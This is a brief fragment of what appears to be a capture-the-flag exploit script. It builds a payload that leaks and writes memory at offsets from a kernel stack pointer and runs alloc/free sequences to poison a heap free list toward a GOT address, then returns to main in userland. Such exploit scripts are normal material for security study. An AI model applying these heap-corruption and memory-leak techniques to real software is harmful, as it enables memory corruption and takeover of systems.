...
# ret 2 main in userland ( for debug )
...
payload += gout(kernel_rsp+0x2100, 0xa0)

# input got addr to fd
payload += gin(kernel_rsp+0x2060, 0x8)
payload += alloc(0x58)
payload += free()
payload += alloc(0x78)
payload += free()
...
payload += gout(kernel_rsp+0x2100, 0x8)
